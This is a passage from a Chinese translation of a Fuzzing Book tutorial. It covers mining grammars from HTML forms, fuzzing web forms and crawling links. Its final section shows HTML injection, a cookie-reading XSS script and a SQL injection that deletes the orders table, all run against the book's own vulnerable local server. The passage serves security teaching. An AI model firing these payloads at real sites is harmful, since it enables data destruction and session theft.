在解析过程中，我们搜索 `<form>` 标签，并将相关的动作（即提交表单时要调用的 URL）保存在 `action` 属性中。在处理表单时，我们创建一个 `fields` 映射，它保存了我们看到的所有输入字段；它将字段名映射到相应的 HTML 输入类型（`"text"`，`"number"`，`"checkbox"` 等）。排他性选择选项映射到可能值的列表；`select` 栈保存当前活动的选择。

```py
class FormHTMLParser(HTMLParser):
  """A parser for HTML forms"""

    def reset(self) -> None:
        super().reset()

        # Form action  attribute (a URL)
        self.action = ""

        # Map of field name to type
        # (or selection name to [option_1, option_2, ...])
        self.fields: Dict[str, List[str]] = {}

        # Stack of currently active selection names
        self.select: List[str] = [] 
```

在解析过程中，解析器为每个找到的打开标签（如 `<form>`）调用 `handle_starttag()`；相反，它为关闭标签（如 `</form>`）调用 `handle_endtag()`。`attributes` 给我们一个关联属性和值的映射。

这里是我们处理单个标签的方式：

+   当我们找到一个 `<form>` 标签时，我们将相关的动作保存在 `action` 属性中；

+   当我们找到一个 `<input>` 标签或类似标签时，我们将类型保存在 `fields` 属性中；

+   当我们找到一个 `<select>` 标签或类似标签时，我们将它的名字推入 `select` 栈中；

+   当我们找到一个 `<option>` 标签时，我们将选项追加到与最后推入的 `<select>` 标签关联的列表中。

```py
class FormHTMLParser(FormHTMLParser):
    def handle_starttag(self, tag, attrs):
        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}
        # print(tag, attributes)

        if tag == "form":
            self.action = attributes.get("action", "")

        elif tag == "select" or tag == "datalist":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = []
                self.select.append(name)
            else:
                self.select.append(None)

        elif tag == "option" and "multiple" not in attributes:
            current_select_name = self.select[-1]
            if current_select_name is not None and "value" in attributes:
                self.fields[current_select_name].append(attributes["value"])

        elif tag == "input" or tag == "option" or tag == "textarea":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = attributes.get("type", "text")

        elif tag == "button":
            if "name" in attributes:
                name = attributes["name"]
                self.fields[name] = [""] 
```

```py
class FormHTMLParser(FormHTMLParser):
    def handle_endtag(self, tag):
        if tag == "select":
            self.select.pop() 
```

我们的实现只处理每个网页上的一个表单；它也只处理 HTML，忽略所有来自 JavaScript 的交互。此外，它不支持所有 HTML 输入类型。

让我们将这个解析器付诸实践。我们创建一个名为`HTMLGrammarMiner`的类，它接受一个 HTML 文档进行解析。然后它返回相关的操作和相关字段：

```py
class HTMLGrammarMiner:
  """Mine a grammar from a HTML form"""

    def __init__(self, html_text: str) -> None:
  """Constructor. `html_text` is the HTML string to parse."""

        html_parser = FormHTMLParser()
        html_parser.feed(html_text)
        self.fields = html_parser.fields
        self.action = html_parser.action 
```

应用到我们的订单表单上，我们得到以下结果：

```py
html_miner = HTMLGrammarMiner(html_text)
html_miner.action 
```

```py
'/order'

```

```py
html_miner.fields 
```

```py
{'item': ['tshirt', 'drill', 'lockset'],
 'name': 'text',
 'email': 'email',
 'city': 'text',
 'zip': 'number',
 'terms': 'checkbox',
 'submit': 'submit'}

```

从这个结构中，我们现在可以生成一个语法，它可以自动产生有效的表单提交 URL。

### 矿化网页语法

要从从 HTML 中提取的字段创建语法，我们基于语法章节中定义的`CGI_GRAMMAR`。关键思想是为每个 HTML 输入类型定义规则：HTML 的`number`类型将获得`<number>`规则中的值；同样，HTML `email`类型的值将从`<email>`规则中定义。我们的默认语法为这些类型提供了非常简单的规则。

```py
from Grammars import crange, srange, new_symbol, unreachable_nonterminals, CGI_GRAMMAR, extend_grammar 
```

```py
class HTMLGrammarMiner(HTMLGrammarMiner):
    QUERY_GRAMMAR: Grammar = extend_grammar(CGI_GRAMMAR, {
        "<start>": ["<action>?<query>"],

        "<text>": ["<string>"],

        "<number>": ["<digits>"],
        "<digits>": ["<digit>", "<digits><digit>"],
        "<digit>": crange('0', '9'),

        "<checkbox>": ["<_checkbox>"],
        "<_checkbox>": ["on", "off"],

        "<email>": ["<_email>"],
        "<_email>": [cgi_encode("<string>@<string>", "<>")],

        # Use a fixed password in case we need to repeat it
        "<password>": ["<_password>"],
        "<_password>": ["abcABC.123"],

        # Stick to printable characters to avoid logging problems
        "<percent>": ["%<hexdigit-1><hexdigit>"],
        "<hexdigit-1>": srange("34567"),

        # Submissions:
        "<submit>": [""]
    }) 
```

我们的语法挖掘器现在将 HTML 中提取的字段转换为规则。本质上，每个遇到的输入字段都会包含在生成的查询 URL 中；并且它得到一个规则，将其扩展到适当类型。

```py
class HTMLGrammarMiner(HTMLGrammarMiner):
    def mine_grammar(self) -> Grammar:
  """Extract a grammar from the given HTML text"""

        grammar: Grammar = extend_grammar(self.QUERY_GRAMMAR)
        grammar["<action>"] = [self.action]

        query = ""
        for field in self.fields:
            field_symbol = new_symbol(grammar, "<" + field + ">")
            field_type = self.fields[field]

            if query != "":
                query += "&"
            query += field_symbol

            if isinstance(field_type, str):
                field_type_symbol = "<" + field_type + ">"
                grammar[field_symbol] = [field + "=" + field_type_symbol]
                if field_type_symbol not in grammar:
                    # Unknown type
                    grammar[field_type_symbol] = ["<text>"]
            else:
                # List of values
                value_symbol = new_symbol(grammar, "<" + field + "-value>")
                grammar[field_symbol] = [field + "=" + value_symbol]
                grammar[value_symbol] = field_type

        grammar["<query>"] = [query]

        # Remove unused parts
        for nonterminal in unreachable_nonterminals(grammar):
            del grammar[nonterminal]

        assert is_valid_grammar(grammar)

        return grammar 
```

让我们再次展示`HTMLGrammarMiner`的作用，再次应用于我们的订单表单。以下是完整的语法结果：

```py
html_miner = HTMLGrammarMiner(html_text)
grammar = html_miner.mine_grammar()
grammar 
```

```py
{'<start>': ['<action>?<query>'],
 '<string>': ['<letter>', '<letter><string>'],
 '<letter>': ['<plus>', '<percent>', '<other>'],
 '<plus>': ['+'],
 '<percent>': ['%<hexdigit-1><hexdigit>'],
 '<hexdigit>': ['0',
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f'],
 '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],
 '<text>': ['<string>'],
 '<number>': ['<digits>'],
 '<digits>': ['<digit>', '<digits><digit>'],
 '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
 '<checkbox>': ['<_checkbox>'],
 '<_checkbox>': ['on', 'off'],
 '<email>': ['<_email>'],
 '<_email>': ['<string>%40<string>'],
 '<hexdigit-1>': ['3', '4', '5', '6', '7'],
 '<submit>': [''],
 '<action>': ['/order'],
 '<item>': ['item=<item-value>'],
 '<item-value>': ['tshirt', 'drill', 'lockset'],
 '<name>': ['name=<text>'],
 '<email-1>': ['email=<email>'],
 '<city>': ['city=<text>'],
 '<zip>': ['zip=<number>'],
 '<terms>': ['terms=<checkbox>'],
 '<submit-1>': ['submit=<submit>'],
 '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}

```

让我们看看语法的结构。它产生如下形式的 URL 路径：

```py
grammar["<start>"] 
```

```py
['<action>?<query>']

```

在这里，`<action>`来自 HTML 表单的`action`属性：

```py
grammar["<action>"] 
```

```py
['/order']

```

`<query>`由单个字段项组成：

```py
grammar["<query>"] 
```

```py
['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']

```

这些字段中的每一个都有`<field-name>=<field-type>`的形式，其中`<field-type>`已经在语法中定义：

```py
grammar["<zip>"] 
```

```py
['zip=<number>']

```

```py
grammar["<terms>"] 
```

```py
['terms=<checkbox>']

```

这些是从语法中产生的查询 URL。我们看到，这些与从我们手工制作的语法中产生的类似，但名称、电子邮件地址和城市的字符串值现在完全是随机的：

```py
order_fuzzer = GrammarFuzzer(grammar)
[order_fuzzer.fuzz() for i in range(3)] 
```

```py
['/order?item=drill&name=++%61&email=%6e%40b++&city=0&zip=88&terms=on&submit=',
 '/order?item=tshirt&name=%3f&email=21+%40+&city=++&zip=4&terms=off&submit=',
 '/order?item=drill&name=2&email=%62%40++%4d1++_%77&city=e%5d&zip=1&terms=on&submit=']

```

我们可以直接将这些输入喂入我们的 Web 浏览器：

```py
HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz()))) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('drill', ' ', '5F @p   a ', 'cdb', '3230')

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=drill&name=+&email=5F+%40p+++a+&city=cdb&zip=3230&terms=on&submit= HTTP/1.1" 200 -

```

**感谢您的 Fuzzingbook 订单！**

我们将向 cdb，3230 发送**一个 FuzzingBook 旋转锤**。

将确认邮件发送到 5F @p a 。

想要更多周边产品？使用我们的订单表单！

我们再次看到，我们可以从给定的数据中自动挖掘语法。

### Web 表单模糊器

为了使事情尽可能方便，让我们定义一个`WebFormFuzzer`类，它在一个地方完成所有操作。给定一个 URL，它提取其 HTML 内容，挖掘语法，然后为它生成输入。

```py
class WebFormFuzzer(GrammarFuzzer):
  """A Fuzzer for Web forms"""

    def __init__(self, url: str, *,
                 grammar_miner_class: Optional[type] = None,
                 **grammar_fuzzer_options):
  """Constructor.
 `url` - the URL of the Web form to fuzz.
 `grammar_miner_class` - the class of the grammar miner
 to use (default: `HTMLGrammarMiner`)
 Other keyword arguments are passed to the `GrammarFuzzer` constructor
 """

        if grammar_miner_class is None:
            grammar_miner_class = HTMLGrammarMiner
        self.grammar_miner_class = grammar_miner_class

        # We first extract the HTML form and its grammar...
        html_text = self.get_html(url)
        grammar = self.get_grammar(html_text)

        # ... and then initialize the `GrammarFuzzer` superclass with it
        super().__init__(grammar, **grammar_fuzzer_options)

    def get_html(self, url: str):
  """Retrieve the HTML text for the given URL `url`.
 To be overloaded in subclasses."""
        return requests.get(url).text

    def get_grammar(self, html_text: str):
  """Obtain the grammar for the given HTML `html_text`.
 To be overloaded in subclasses."""
        grammar_miner = self.grammar_miner_class(html_text)
        return grammar_miner.mine_grammar() 
```

现在要模糊一个 Web 表单，只需要提供其 URL：

```py
web_form_fuzzer = WebFormFuzzer(httpd_url)
web_form_fuzzer.fuzz() 
```

```py
'/order?item=lockset&name=%6b+&email=+%40b5&city=%7e+5&zip=65&terms=on&submit='

```

我们可以将模糊器与上面定义的`WebRunner`结合起来，直接在我们的 Web 服务器上运行生成的模糊输入：

```py
web_form_runner = WebRunner(httpd_url)
web_form_fuzzer.runs(web_form_runner, 10) 
```

```py
[('http://127.0.0.1:8800/order?item=drill&name=+%6d&email=%40%400&city=%64&zip=9&terms=on&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=lockset&name=++&email=%63%40d&city=_&zip=6&terms=on&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=lockset&name=+&email=d%40_-&city=2++0&zip=1040&terms=off&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=tshirt&name=%4bb&email=%6d%40+&city=%7a%79+&zip=13&terms=off&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=lockset&name=d&email=%55+%40%74&city=+&zip=4&terms=on&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=tshirt&name=_+2&email=1++%40+&city=+&zip=30&terms=on&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=tshirt&name=+&email=a-%40+&city=+%57&zip=2&terms=on&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=lockset&name=%56&email=++%40a%55ee%44&city=+&zip=01&terms=off&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=tshirt&name=%6fc&email=++%40+&city=a&zip=25&terms=off&submit=',
  'PASS'),
 ('http://127.0.0.1:8800/order?item=drill&name=55&email=3%3e%40%405&city=%4c&zip=0&terms=off&submit=',
  'PASS')]

```

虽然使用方便，但这个模糊器仍然非常基础：

+   它限制每页一个表单。

+   它只支持`GET`操作（即输入编码到 URL 中）。一个完整的 Web 表单模糊器至少需要支持`POST`操作。

+   这个模糊器仅基于 HTML 构建。没有对动态 Web 页面的 JavaScript 处理。

在我们进入下一节之前，让我们清除任何挂起的消息：

```py
clear_httpd_messages() 
```

## 爬取用户界面

到目前为止，我们假设只有一个表单需要探索。当然，一个真实的 Web 服务器有多个页面——以及可能还有多个表单。我们定义了一个简单的*爬虫*，它会探索从一个页面起源的所有链接。

我们的爬虫相当简单。其主要组件再次是一个`HTMLParser`，它分析 HTML 代码以查找形式为

```py
<a href="<link>"> 
```

并将找到的所有链接保存到一个名为`links`的列表中。

```py
class LinkHTMLParser(HTMLParser):
  """Parse all links found in a HTML page"""

    def reset(self):
        super().reset()
        self.links = []

    def handle_starttag(self, tag, attrs):
        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}

        if tag == "a" and "href" in attributes:
            # print("Found:", tag, attributes)
            self.links.append(attributes["href"]) 
```

实际的爬虫是一个*生成器函数* `crawl()`，它一个接一个地产生一个 URL。默认情况下，它只返回位于同一主机的 URL；参数`max_pages`控制应该扫描多少页面（默认：1）。我们还尊重远程站点上的`robots.txt`文件，以检查我们允许扫描哪些页面。

<details id="Excursion:-Implementing-a-Crawler"><summary>实现一个爬虫</summary>

```py
from [collections](https://docs.python.org/3/library/collections.html) import deque
import [urllib.robotparser](https://docs.python.org/3/library/urllib.robotparser.html) 
```

```py
def crawl(url, max_pages: Union[int, float] = 1, same_host: bool = True):
  """Return the list of linked URLs from the given URL.
 `max_pages` - the maximum number of pages accessed.
 `same_host` - if True (default), stay on the same host"""

    pages = deque([(url, "<param>")])
    urls_seen = set()

    rp = urllib.robotparser.RobotFileParser()
    rp.set_url(urljoin(url, "/robots.txt"))
    rp.read()

    while len(pages) > 0 and max_pages > 0:
        page, referrer = pages.popleft()
        if not rp.can_fetch("*", page):
            # Disallowed by robots.txt
            continue

        r = requests.get(page)
        max_pages -= 1

        if r.status_code != HTTPStatus.OK:
            print("Error " + repr(r.status_code) + ": " + page,
                  "(referenced from " + referrer + ")",
                  file=sys.stderr)
            continue

        content_type = r.headers["content-type"]
        if not content_type.startswith("text/html"):
            continue

        parser = LinkHTMLParser()
        parser.feed(r.text)

        for link in parser.links:
            target_url = urljoin(page, link)
            if same_host and urlsplit(
                    target_url).hostname != urlsplit(url).hostname:
                # Different host
                continue

            if urlsplit(target_url).fragment != "":
                # Ignore #fragments
                continue

            if target_url not in urls_seen:
                pages.append((target_url, page))
                urls_seen.add(target_url)
                yield target_url

        if page not in urls_seen:
            urls_seen.add(page)
            yield page 
```</details>

我们可以在自己的服务器上运行爬虫，它将很快返回订单页面和条款和条件页面。

```py
for url in crawl(httpd_url):
    print_httpd_messages()
    print_url(url) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /robots.txt HTTP/1.1" 404 -

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET / HTTP/1.1" 200 -

```

```py
http://127.0.0.1:8800/terms
```

```py
http://127.0.0.1:8800
```

我们还可以爬取其他网站，例如这个项目的首页。

```py
for url in crawl("https://www.fuzzingbook.org/"):
    print_url(url) 
```

```py
https://www.fuzzingbook.org/
```

```py
https://www.fuzzingbook.org/html/00_Table_of_Contents.html
```

```py
https://www.fuzzingbook.org/html/01_Intro.html
```

```py
https://www.fuzzingbook.org/html/Tours.html
```

```py
https://www.fuzzingbook.org/html/Intro_Testing.html
```

```py
https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html
```

```py
https://www.fuzzingbook.org/html/Fuzzer.html
```

```py
https://www.fuzzingbook.org/html/Coverage.html
```

```py
https://www.fuzzingbook.org/html/MutationFuzzer.html
```

```py
https://www.fuzzingbook.org/html/GreyboxFuzzer.html
```

```py
https://www.fuzzingbook.org/html/SearchBasedFuzzer.html
```

```py
https://www.fuzzingbook.org/html/MutationAnalysis.html
```

```py
https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html
```

```py
https://www.fuzzingbook.org/html/Grammars.html
```

```py
https://www.fuzzingbook.org/html/GrammarFuzzer.html
```

```py
https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html
```

```py
https://www.fuzzingbook.org/html/Parser.html
```

```py
https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html
```

```py
https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html
```

```py
https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html
```

```py
https://www.fuzzingbook.org/html/Reducer.html
```

```py
https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html
```

```py
https://www.fuzzingbook.org/html/FuzzingWithConstraints.html
```

```py
https://www.fuzzingbook.org/html/GrammarMiner.html
```

```py
https://www.fuzzingbook.org/html/InformationFlow.html
```

```py
https://www.fuzzingbook.org/html/ConcolicFuzzer.html
```

```py
https://www.fuzzingbook.org/html/SymbolicFuzzer.html
```

```py
https://www.fuzzingbook.org/html/DynamicInvariants.html
```

```py
https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html
```

```py
https://www.fuzzingbook.org/html/ConfigurationFuzzer.html
```

```py
https://www.fuzzingbook.org/html/APIFuzzer.html
```

```py
https://www.fuzzingbook.org/html/Carver.html
```

```py
https://www.fuzzingbook.org/html/PythonFuzzer.html
```

```py
https://www.fuzzingbook.org/html/WebFuzzer.html
```

```py
https://www.fuzzingbook.org/html/GUIFuzzer.html
```

```py
https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html
```

```py
https://www.fuzzingbook.org/html/FuzzingInTheLarge.html
```

```py
https://www.fuzzingbook.org/html/WhenToStopFuzzing.html
```

```py
https://www.fuzzingbook.org/html/99_Appendices.html
```

```py
https://www.fuzzingbook.org/html/AcademicPrototyping.html
```

```py
https://www.fuzzingbook.org/html/PrototypingWithPython.html
```

```py
https://www.fuzzingbook.org/html/ExpectError.html
```

```py
https://www.fuzzingbook.org/html/Timer.html
```

```py
https://www.fuzzingbook.org/html/Timeout.html
```

```py
https://www.fuzzingbook.org/html/ClassDiagram.html
```

```py
https://www.fuzzingbook.org/html/RailroadDiagrams.html
```

```py
https://www.fuzzingbook.org/html/ControlFlow.html
```

```py
https://www.fuzzingbook.org/html/00_Index.html
```

```py
https://www.fuzzingbook.org/dist/fuzzingbook-code.zip
```

```py
https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip
```

```py
https://www.fuzzingbook.org/html/ReleaseNotes.html
```

```py
https://www.fuzzingbook.org/html/Importing.html
```

```py
https://www.fuzzingbook.org/slides/Fuzzer.slides.html
```

```py
https://www.fuzzingbook.org/html/Guide_for_Authors.html
```

一旦我们爬取了一个网站的所有链接，我们就可以为找到的所有表单生成测试：

```py
for url in crawl(httpd_url, max_pages=float('inf')):
    web_form_fuzzer = WebFormFuzzer(url)
    web_form_runner = WebRunner(url)
    print(web_form_fuzzer.run(web_form_runner)) 
```

```py
('http://127.0.0.1:8800/terms', 'PASS')
('http://127.0.0.1:8800/order?item=tshirt&name=+&email=b+%742%40+&city=%45%39&zip=54&terms=on&submit=', 'PASS')
('http://127.0.0.1:8800/order?item=drill&name=%52-&email=e%40%3f&city=+&zip=5&terms=on&submit=', 'PASS')

```

为了获得更好的效果，可以将爬取和模糊测试集成在一起——并分析订单确认页面以查找更多链接。我们将这个作为练习留给读者。

让我们消除上面累积的任何服务器消息：

```py
clear_httpd_messages() 
```

## 构建 Web 攻击

在我们结束这一章之前，让我们看看一类特殊的“不常见”的输入，它们不仅会导致通用失败，而且实际上允许*攻击者*随意操纵服务器。我们将使用我们的服务器演示三种常见的攻击，而这个服务器（惊喜）实际上对所有这些攻击都易受攻击。

### HTML 注入攻击

我们首先考虑的一种攻击是*HTML 注入*。HTML 注入的想法是向 Web 服务器提供*也可以被解释为 HTML 的数据*。如果这些 HTML 数据随后在用户的 Web 浏览器中显示，它可能具有恶意目的，尽管（表面上）起源于一个信誉良好的网站。如果这些数据也被*存储*，它就成为一种*持久性*攻击；攻击者甚至不需要引诱受害者访问特定页面。

这里是一个（简单的）HTML 注入的例子。对于`name`字段，我们不仅使用纯文本，还嵌入 HTML 标签——在这种情况下，是一个指向恶意软件托管网站的链接。

```py
from Grammars import extend_grammar 
```

```py
ORDER_GRAMMAR_WITH_HTML_INJECTION: Grammar = extend_grammar(ORDER_GRAMMAR, {
    "<name>": [cgi_encode('''
 Jane Doe<p>
 <strong><a href="www.lots.of.malware">Click here for cute cat pictures!</a></strong>
 </p>
 ''')],
}) 
```

如果我们使用这种语法来创建输入，生成的 URL 将包含所有 HTML 编码在：

```py
html_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_HTML_INJECTION)
order_with_injected_html = html_injection_fuzzer.fuzz()
order_with_injected_html 
```

```py
'/order?item=drill&name=%0a++++Jane+Doe%3cp%3e%0a++++%3cstrong%3e%3ca+href%3d%22www.lots.of.malware%22%3eClick+here+for+cute+cat+pictures!%3c%2fa%3e%3c%2fstrong%3e%0a++++%3c%2fp%3e%0a++++&email=j_smith%40example.com&city=Seattle&zip=02805'

```

如果我们将这个字符串发送到我们的 Web 服务器会发生什么？结果是 HTML 被留在确认页面上，并显示为链接。这也在日志中发生：

```py
HTML(webbrowser(urljoin(httpd_url, order_with_injected_html))) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('drill', '
    Jane Doe
    **Click here for cute cat pictures!**

    ', 'j_smith@example.com', 'Seattle', '02805')

```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] "GET /order?item=drill&name=%0A++++Jane+Doe%3Cp%3E%0A++++%3Cstrong%3E%3Ca+href%3D%22www.lots.of.malware%22%3EClick+here+for+cute+cat+pictures!%3C%2Fa%3E%3C%2Fstrong%3E%0A++++%3C%2Fp%3E%0A++++&email=j_smith%40example.com&city=Seattle&zip=02805 HTTP/1.1" 200 -

```

**感谢您的 Fuzzingbook 订单！**

我们将向 Jane Doe 发送**One FuzzingBook 电钻锤**

**点击这里查看可爱的猫图片！**

西雅图，02805

将确认邮件发送至 j_smith@example.com。

想要更多周边产品？请使用我们的订单表单！

由于链接看起来似乎来自一个受信任的源，用户更有可能跟随它。链接甚至持久存在，因为它存储在数据库中：

```py
print(db.execute("SELECT * FROM orders WHERE name LIKE '%<%'").fetchall()) 
```

```py
[('drill', '\n    Jane Doe<p>\n    <strong><a href="www.lots.of.malware">Click here for cute cat pictures!</a></strong>\n    </p>\n    ', 'j_smith@example.com', 'Seattle', '02805')]

```

这意味着如果任何人查询数据库（例如，处理订单的操作员），他们也会看到链接，从而扩大其影响。通过精心制作注入的 HTML，一个人可以因此将恶意内容暴露给众多用户——直到注入的 HTML 最终被删除。

### 跨站脚本攻击

如果一个人可以将 HTML 代码注入到 Web 页面中，那么他也可以将*JavaScript*代码作为注入 HTML 的一部分注入。此代码将在注入的 HTML 渲染时立即执行。

这尤其危险，因为执行的 JavaScript 总是在包含它的页面的*源*中执行。因此，攻击者通常无法强迫用户在他自己不控制的任何源中运行 JavaScript。然而，当攻击者可以将他的代码注入到一个易受攻击的 Web 应用程序中时，他可以让客户端以（受信任的）Web 应用程序作为源来运行代码。

在这种*跨站脚本*（XSS）攻击中，注入的脚本可以做的不仅仅是普通的 HTML。例如，代码可以访问敏感的页面内容或会话 cookie。如果相关的代码在操作员的浏览器中运行（例如，因为操作员正在审查订单列表），它就可以检索屏幕上显示的任何其他信息，从而窃取各种客户的订单详情。

这里是一个脚本注入的非常简单的例子。每当显示名称时，它都会导致浏览器“窃取”当前的*会话 cookie*——浏览器用来识别用户与服务器之间的数据。在我们的情况下，我们可以窃取 Jupyter 会话的 cookie。

```py
ORDER_GRAMMAR_WITH_XSS_INJECTION: Grammar = extend_grammar(ORDER_GRAMMAR, {
    "<name>": [cgi_encode('Jane Doe' +
                          '<script>' +
                          'document.title = document.cookie.substring(0, 10);' +
                          '</script>')
               ],
}) 
```

```py
xss_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_XSS_INJECTION)
order_with_injected_xss = xss_injection_fuzzer.fuzz()
order_with_injected_xss 
```

```py
'/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'

```

```py
url_with_injected_xss = urljoin(httpd_url, order_with_injected_xss)
url_with_injected_xss 
```

```py
'http://127.0.0.1:8800/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'

```

```py
HTML(webbrowser(url_with_injected_xss, mute=True)) 
```

**感谢您的 Fuzzingbook 订单！**

我们将向西雅图的 Jane Doe 发送**一套 FuzzingBook 锁**，地址为 34506

将向 j.doe@example.com 发送确认邮件。

想要更多周边产品？请使用我们的订单表单！

消息看起来和以前一样——但如果你看看你的浏览器标题，它现在应该显示你的“秘密”笔记本 cookie 的前 10 个字符。脚本不仅可以在标题中显示其前缀，还可以静默地将 cookie 发送到远程服务器，允许攻击者劫持你的当前笔记本会话并代表你与服务器交互。它还可以访问并发送浏览器中显示或以其他方式可用的任何其他数据。它可以运行*键盘记录器*并窃取密码和其他敏感数据，就像它们被输入时一样。同样，它将在浏览器中显示 Jane Doe 的受损害订单并执行相关脚本时每次执行。

让我们去重置标题到一个不那么敏感的值：

```py
HTML('<script>document.title = "Jupyter"</script>') 
```

### SQL 注入攻击

跨站脚本与网页具有相同的权限——最值得注意的是，它们无法访问或更改浏览器之外的数据。所谓的*SQL 注入*针对*数据库*，允许注入可以读取或修改数据库中的数据或更改原始查询目的的命令。

为了理解 SQL 注入是如何工作的，让我们看看生成将新订单插入数据库的 SQL 命令的代码：

```py
sql_command = ("INSERT INTO orders " +
    "VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)) 
```

如果任何值（比如`name`）的值*也可以被解释为 SQL 命令会发生什么？*那么，我们就不会执行预期的`INSERT`命令，而是执行由`name`强加的命令。

让我们用一个例子来说明这一点。我们将个体值设置为在执行过程中可能会找到的值：

```py
values: Dict[str, str] = {
    "item": "tshirt",
    "name": "Jane Doe",
    "email": "j.doe@example.com",
    "city": "Seattle",
    "zip": "98104"
} 
```

并将字符串格式化为上面所示的形式：

```py
sql_command = ("INSERT INTO orders " +
               "VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values))
sql_command 
```

```py
"INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'j.doe@example.com', 'Seattle', '98104')"

```

一切都很好，对吧？但现在，我们定义一个非常“特殊”的名称，它也可以被解释为 SQL 命令：

```py
values["name"] = "Jane', 'x', 'x', 'x'); DELETE FROM orders; -- " 
```

```py
sql_command = ("INSERT INTO orders " +
               "VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values))
sql_command 
```

```py
"INSERT INTO orders VALUES ('tshirt', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; -- ', 'j.doe@example.com', 'Seattle', '98104')"

```

这里发生的情况是，我们现在得到了一个命令，用于将值插入数据库（带有一些“虚拟”值`x`），然后是一个 SQL `DELETE`命令，该命令将*删除订单表中的所有条目*。字符串`--`开始一个 SQL *注释*，这样就可以轻松忽略原始查询的其余部分。通过构建也可以被解释为 SQL 命令的字符串，攻击者可以更改或删除数据库数据，绕过身份验证机制以及更多。

我们的服务器也容易受到这种攻击吗？当然，是的。我们创建一个特殊的语法，这样我们就可以将`<name>`参数设置为上面所示带有 SQL 注入的字符串。

```py
from Grammars import extend_grammar 
```

```py
ORDER_GRAMMAR_WITH_SQL_INJECTION = extend_grammar(ORDER_GRAMMAR, {
    "<name>": [cgi_encode("Jane', 'x', 'x', 'x'); DELETE FROM orders; --")],
}) 
```

```py
sql_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_SQL_INJECTION)
order_with_injected_sql = sql_injection_fuzzer.fuzz()
order_with_injected_sql 
```

```py
"/order?item=drill&name=Jane',+'x',+'x',+'x')%3b+DELETE+FROM+orders%3b+--&email=j.doe%40example.com&city=New+York&zip=14083"

```

这些是当前的订单：

```py
print(db.execute("SELECT * FROM orders").fetchall()) 
```

```py
[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631'), ('drill', 'Jane Doe', 'j.doe@example.com', '', '45732'), ('drill', 'Jane Doe', 'j,doe@example.com', 'Seattle', '45732'), ('drill', ' ', '5F @p   a ', 'cdb', '3230'), ('drill', ' m', '@@0', 'd', '9'), ('lockset', '  ', 'c@d', '_', '6'), ('lockset', ' ', 'd@_-', '2  0', '1040'), ('tshirt', 'Kb', 'm@ ', 'zy ', '13'), ('lockset', 'd', 'U @t', ' ', '4'), ('tshirt', '_ 2', '1  @ ', ' ', '30'), ('tshirt', ' ', 'a-@ ', ' W', '2'), ('lockset', 'V', '  @aUeeD', ' ', '01'), ('tshirt', 'oc', '  @ ', 'a', '25'), ('drill', '55', '3>@@5', 'L', '0'), ('tshirt', ' ', 'b t2@ ', 'E9', '54'), ('drill', 'R-', 'e@?', ' ', '5'), ('drill', '\n    Jane Doe<p>\n    <strong><a href="www.lots.of.malware">Click here for cute cat pictures!</a></strong>\n    </p>\n    ', 'j_smith@example.com', 'Seattle', '02805'), ('lockset', 'Jane Doe<script>document.title = document.cookie.substring(0, 10);</script>', 'j.doe@example.com', 'Seattle', '34506')]

```

让我们去向服务器发送带有 SQL 注入的 URL。从日志中我们可以看到，“恶意”的 SQL 命令就像上面草图所示的那样形成并执行了。

```py
contents = webbrowser(urljoin(httpd_url, order_with_injected_sql)) 
```

```py
127.0.0.1 - - [16/Jan/2025 11:12:26] INSERT INTO orders VALUES ('drill', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; --', 'j.doe@example.com', 'New York', '14083')

```

```py
